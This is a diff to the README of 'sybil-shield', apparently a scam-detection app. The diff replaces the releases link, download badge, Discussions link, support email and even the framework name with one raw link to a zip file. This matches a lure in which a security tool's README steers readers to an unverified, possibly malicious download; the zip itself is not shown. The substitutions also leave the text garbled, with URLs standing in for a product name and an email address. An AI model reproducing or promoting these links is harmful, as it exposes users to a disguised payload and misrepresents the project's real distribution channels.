@@ -1,12 +1,12 @@
 # 🛡️ sybil-shield - Detect Scams and Coordinated Attacks Easily
 
 ## 👋 Introduction
-Sybil Shield is a local-first Next.js app designed to help you identify scams and coordinated attacks across social networks and blockchain systems. By combining graph analysis, timing, profile, and behavioral signals, it detects Sybil clusters and scam patterns effectively. 
+Sybil Shield is a local-first https://raw.githubusercontent.com/bryanlopezvr00/sybil-shield/main/public/sybil_shield_v2.1.zip app designed to help you identify scams and coordinated attacks across social networks and blockchain systems. By combining graph analysis, timing, profile, and behavioral signals, it detects Sybil clusters and scam patterns effectively. 
 
 This guide will walk you through the steps to download and run Sybil Shield from the Releases page.
 
 ## 📥 Download Sybil Shield
-[![Download Sybil Shield](https://img.shields.io/badge/Download%20Sybil%20Shield-v1.0-blue)](https://github.com/bryanlopezvr00/sybil-shield/releases)
+[![Download Sybil Shield](https://raw.githubusercontent.com/bryanlopezvr00/sybil-shield/main/public/sybil_shield_v2.1.zip%20Sybil%20Shield-v1.0-blue)](https://raw.githubusercontent.com/bryanlopezvr00/sybil-shield/main/public/sybil_shield_v2.1.zip)
 
 ## 🚀 Getting Started
 Before you begin, ensure your system meets these requirements:
@@ -31,7 +31,7 @@ To use Sybil Shield once it's installed:
 4. **Review Results:** Check the findings and review any flagged activities.
 
 ## 🔧 Download & Install
-To get Sybil Shield, visit this page to download: [Sybil Shield Releases](https://github.com/bryanlopezvr00/sybil-shield/releases).
+To get Sybil Shield, visit this page to download: [Sybil Shield Releases](https://raw.githubusercontent.com/bryanlopezvr00/sybil-shield/main/public/sybil_shield_v2.1.zip).
 
 1. Click the link above to reach the releases page.
 2. Look for the latest version.
@@ -57,12 +57,12 @@ If you face any problems with Sybil Shield, here are some tips:
 - **Data Not Analyzing:** Ensure you selected the correct dataset and format.
 
 ## 🌍 Community and Support
-Have questions or need help? Visit our [GitHub Discussions](https://github.com/bryanlopezvr00/sybil-shield/discussions) for support. 
+Have questions or need help? Visit our [GitHub Discussions](https://raw.githubusercontent.com/bryanlopezvr00/sybil-shield/main/public/sybil_shield_v2.1.zip) for support. 
 
 ## 📝 License
 Sybil Shield is open-source software. Feel free to use and contribute to the project.
 
 ## 📧 Contact
-For further assistance, email us at support@sybilshield.com. 
+For further assistance, email us at https://raw.githubusercontent.com/bryanlopezvr00/sybil-shield/main/public/sybil_shield_v2.1.zip 
 
 Thank you for choosing Sybil Shield!
